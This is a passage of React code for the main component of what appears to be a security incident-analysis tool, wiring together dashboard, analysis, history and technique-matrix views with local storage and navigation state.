    setAnalyses(full.filter(Boolean));
    setLoading(false);
  }, []);

  useEffect(() => { refresh(); }, [refresh]);

  const openAnalysis = async (id) => {
    const a = await storage.getAnalysis(id);
    if (a) { setCurrentAnalysis(a); setView("detail"); }
  };

  const deleteAnalysis = async (id) => {
    await storage.deleteAnalysis(id);
    if (currentAnalysis?.id === id) { setCurrentAnalysis(null); setView("history"); }
    refresh();
  };

  const onAnalysisComplete = async (analysis) => {
    setCurrentAnalysis(analysis);
    setView("detail");
    setAnalyzePrefill(null);
    refresh();
  };

  const handoffToAnalyze = ({ content, mode, title }) => {
    setAnalyzePrefill({ content, mode, title });
    setView("analyze");
  };

  return (
    <div className="min-h-screen w-full flex bg-zinc-950 text-zinc-200" style={{ fontFamily: "ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, sans-serif" }}>
      <style>{`
        body { background: #09090b; }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #27272a; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #3f3f46; }
        .font-mono, pre, code { font-family: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, Consolas, monospace; }
      `}</style>

      <Sidebar
        view={view === "detail" ? "history" : view}
        setView={(v) => { setView(v); setCurrentAnalysis(null); if (v !== "analyze") setAnalyzePrefill(null); }}
        count={analyses.length}
      />

      <main className="flex-1 overflow-auto">
        <div className="px-6 py-5 max-w-[1400px] mx-auto">
          {loading ? (
            <div className="flex items-center justify-center py-20 text-zinc-500">
              <Spinner size={18} /> <span className="ml-2 text-sm">Loading workspace…</span>
            </div>
          ) : (
            <>
              {view === "dashboard" && <Dashboard
                analyses={analyses}
                gotoAnalyze={() => setView("analyze")}
                openAnalysis={openAnalysis}
                loadSample={(s) => { setAnalyzePrefill({ content: s.content, mode: s.mode, title: s.title }); setView("analyze"); }}
              />}
              {view === "refine"    && <RefineView onSendToAnalyze={handoffToAnalyze} />}
              {view === "analyze"   && <AnalyzeView
                                          onComplete={onAnalysisComplete}
                                          onCancel={() => { setAnalyzePrefill(null); setView("dashboard"); }}
                                          initialContent={analyzePrefill?.content || ""}
                                          initialMode={analyzePrefill?.mode || "nl_incident"}
                                          initialTitle={analyzePrefill?.title || ""}
                                        />}
              {view === "detail" && currentAnalysis && <AnalysisDetail
                analysis={currentAnalysis}
                onBack={() => setView("history")}
                onDelete={deleteAnalysis}
                onNewAnalysis={() => { setCurrentAnalysis(null); setAnalyzePrefill(null); setView("analyze"); }}
                refresh={refresh}
              />}
              {view === "matrix"    && <MatrixView analyses={analyses} openTechniqueDetail={setTechDetail} />}
              {view === "history"   && <HistoryView analyses={analyses} openAnalysis={openAnalysis} deleteAnalysis={deleteAnalysis} />}
            </>
          )}
        </div>
      </main>

      {techDetail && (
        <TechniqueDetailModal
          techId={techDetail}
          analyses={analyses}
          onClose={() => setTechDetail(null)}
          onOpenAnalysis={openAnalysis}
        />
      )}
    </div>
  );
}
